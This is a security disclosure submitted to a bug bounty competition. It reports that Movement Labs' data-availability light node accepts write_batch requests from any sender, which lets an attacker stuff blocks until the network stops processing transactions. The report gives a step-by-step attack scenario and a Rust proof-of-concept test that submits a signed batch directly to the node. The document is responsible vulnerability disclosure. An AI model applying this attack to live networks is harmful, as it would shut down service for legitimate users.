# #43290 \[BC-Critical] Anyone can send a write\_batch to the DA node, enabling a DOS attack that shuts down the network

**Submitted on Apr 4th 2025 at 10:43:24 UTC by @niroh for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43290
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Vulnerability Details

The block building flow in movement includes the following steps (based on the walkthrough description of how the system will work initially, with a single validator):

1. a (single) full node accepts submit\_transaction requests from users
2. The node applies various logic and validations (including transaction validation, prioritization, using core\_mempool logic etc.) to create a transaction batch that is sent to the da light node every 2 seconds.
3. The DA light node receives these batches (through the write\_batch api) and adds them to its own mempool (RockDB)
4. Periodically the DA light node constructs blocks from its mempool (every 0.5 seconds or when at least 2048 txs accumulate) and writes them to celestia
5. The full node fetches the ordered block from celestia, executes it and adds it to its da\_db.

The issue arises from the fact the the DA node has no sender validation in place when it receives batches through write\_batch. It only validates that the transactions themselves are well formatted and properly signed. This means anyone can generate a batch of well formed, well signed transactions and send it to the DA node, completely bypassing any full node logic or safeguards such as sending schedule, full transaction validation, sequence number validity, batch size limits/timing and so on.

This enables various attacks (e.g. front running mempool transactions by timing a batch to be sent before the IngressTask window ends) however the most severe is causing a full network DOS using the following scenario:

The following describes the attack scenario:

1. The attacker creates batches of transactions that are well formed and signed, but are designed to fail execution without having any gas charged, for example by sending them from an account with zero balance to pay gas. Had these transactions been submitted through the full node they would never reach execution, because of the TransactionPipe validations, but since the attacker submits directly to the DA node, they are accepted.
2. The attacker sets the gas price of all transactions to the highest possible value (knowing they will never get charged).
3. The batches are of the largest size acceptable by the DA node API. Since no batch size limit is enforced by the DA, the only limit is the API message size limit (typically defaults at 4Mb) enabling batches of thousands of transactions.
4. The attacker sends the batches automatically at millisecond intervals.
5. The DA node builds a block every 0.5 seconds, or whenever more than 2048 transactions are waiting in the mempool as can be seen here (block\_size is set to 2048 by default):

```rust
loop {
    let current_block_size = transactions.len() as u32;
    if current_block_size >= self.block_size {
        break;
    }

    let remaining = self.block_size - current_block_size;
    let mut transactions_to_add = self.mempool.pop_transactions(remaining as usize).await?;
    transactions.append(&mut transactions_to_add);

    // sleep to yield to other tasks and wait for more transactions
    tokio::task::yield_now().await;

    if now.elapsed().as_millis() as u64 > self.building_time_ms {
        break;
    }
}
```

6. This means each huge batch would trigger a block building cycle (creating a Block from the dummy transactions, writing it to celestia)
7. The full node will picks block from the DA as they are written, as can be seen here:

```rust
let mut blocks_from_da = self
			.da_light_node_client
			.stream_read_from_height(StreamReadFromHeightRequest { height: synced_height })
			.await
			.map_err(|e| {
				error!("Failed to stream blocks from DA: {:?}", e);
				e
			})?;

		loop {
			select! {
				Some(res) = blocks_from_da.next() => {
					let response = res.context("failed to get next block from DA")?;
					debug!("Received block from DA");
					self.process_block_from_da(response).await?;
				}
				Some(res) = self.commitment_events.next() => {
					let event = res.context("failed to get commitment event")?;
					debug!("Received commitment event");
					self.process_commitment_event(event).await?;
				}
				else => break,
			}
		}
```

This means the stuffed blocks will be constantly picked up from the DA and executed by the full node.

8. Since there are no restrictions on the number of transactions per block, nor on block execution gas or block building frequency, the full node will eventually lag to the point where legitimate transactions are never processed (or processed with such delay that they are likely to expire.)

## Impact Details

As described above, the result of the attack is a full network shutdown since legitimate transactions can not be processed it time.

## Proof of Concept

## Proof of Concept

The following POC shows how anyone can submit a transaction batch to the DA lightnode (no special authrization required) and the transaction will be picked up by the da node, and trigger a block that will be executed by the full node.

To run:

1. First run Movement init using the CLI to initialize and fund the default account defined in the config.yaml file under movement-client.
2. Run just movement-celestia-da-light-node native build.setup.test.local to launch the test environment
3. Copy the default account private key to the marked place in the test function
4. Add the test function code below to mod.rs under movement-client/src/tests and run it with cargo test
5. Check the DA node log files to see that a block has been created based on the batch\_write, and the full node logs to see that the block (and the test transaction) were executed successfully.

### test function

```rust

#[tokio::test]
async fn test_lightnode() -> Result<(), anyhow::Error> {
   let light_node_connection_protocol = SUZUKA_CONFIG
       .celestia_da_light_node
       .celestia_da_light_node_config
       .movement_da_light_node_connection_protocol();


   // todo: extract into getter
   let light_node_connection_hostname = SUZUKA_CONFIG
       .celestia_da_light_node
       .celestia_da_light_node_config
       .movement_da_light_node_connection_hostname();


   // todo: extract into getter
   let light_node_connection_port = SUZUKA_CONFIG
       .celestia_da_light_node
       .celestia_da_light_node_config
       .movement_da_light_node_connection_port();
   // todo: extract into getter
   println!(
       "Connecting to light node at {}:{}",
       light_node_connection_hostname, light_node_connection_port
   );
   let mut light_node_client = if SUZUKA_CONFIG
       .celestia_da_light_node
       .celestia_da_light_node_config
       .movement_da_light_node_http1()
   {
       println!("Creating the http1 client");
       MovementDaLightNodeClient::try_http1(
           format!(
               "{}://{}:{}",
               light_node_connection_protocol,
               light_node_connection_hostname,
               light_node_connection_port
           )
           .as_str(),
       )
       .context("Failed to connect to light node")?
   } else {
       println!("Creating the http2 client");
       MovementDaLightNodeClient::try_http2(
           format!(
               "{}://{}:{}",
               light_node_connection_protocol,
               light_node_connection_hostname,
               light_node_connection_port
           )
           .as_str(),
       )
       .await
       .context("Failed to connect to light node")?
   };


   //create junk da write


   //init sender
   let private_key_import = "YOUR_DEFAULT_ACCOUNT_PRIVATE_KEY";
   let private_key = Ed25519PrivateKey::from_encoded_string(private_key_import)?;
   let public_key = Ed25519PublicKey::from(&private_key);
   let module_address = AuthenticationKey::ed25519(&public_key).account_address();


   let rest_client = Client::new(NODE_URL.clone());
   let faucet_client = FaucetClient::new(FAUCET_URL.clone(), NODE_URL.clone()); // <:!:section_1a


   let account_client = rest_client.get_account(module_address).await?;
   let sequence_number = account_client.inner().sequence_number;
   println!("default account sequence number: {}", sequence_number);
   println!("default account address {}", module_address);
   let mut module_account = LocalAccount::from_private_key(private_key_import, sequence_number)?;


   let chain_id = rest_client.get_index().await?.inner().chain_id;


   // :!:>section_1b
   //let coin_client = CoinClient::new(&rest_client); // <:!:section_1b


   //let alice = LocalAccount::generate(&mut rand::rngs::OsRng);
   //let bob = LocalAccount::generate(&mut rand::rngs::OsRng);


   // Print account addresses.
   //println!("\n=== Addresses ===");
   //println!("Alice: {} private key: {}", alice.address().to_hex_literal(), alice.private_key());


   //faucet_client.fund(alice.address(), 100_000_000).await?;
   //faucet_client.fund(bob.address(), 100_000_000).await?;


   //creates transactions vector
   let mut transactions = Vec::new();


   //create a dummy signed transaction
   let payload = TransactionPayload::Script(Script::new(EMPTY_SCRIPT.to_vec(), vec![], vec![]));
   let raw_txn = RawTransaction::new(
       module_address,
       sequence_number,
       payload,
       5000,
       100,
       1743954465,
       ChainId::new(chain_id),
   );


   let signature = private_key.sign(&raw_txn).unwrap();


   let transaction = SignedTransaction::new(raw_txn, public_key, signature);


   let serialized_aptos_transaction = bcs::to_bytes(&transaction)?;
   let movement_transaction = movement_types::transaction::Transaction::new(
       serialized_aptos_transaction,
       20,
       sequence_number,
   );
   let serialized_transaction = serde_json::to_vec(&movement_transaction)?;
   transactions.push(BlobWrite { data: serialized_transaction });


   let batch_write = BatchWriteRequest { blobs: transactions };
   //let mut buf = Vec::new();
   //batch_write.encode_raw(&mut buf);
   match light_node_client.batch_write(batch_write.clone()).await {
       Ok(_) => {
           println!("batch_write_success");
       }
       Err(e) => {
           println!("failed to write batch to DA: {:?} ", e);
       }
   }
   Ok(())
}

```
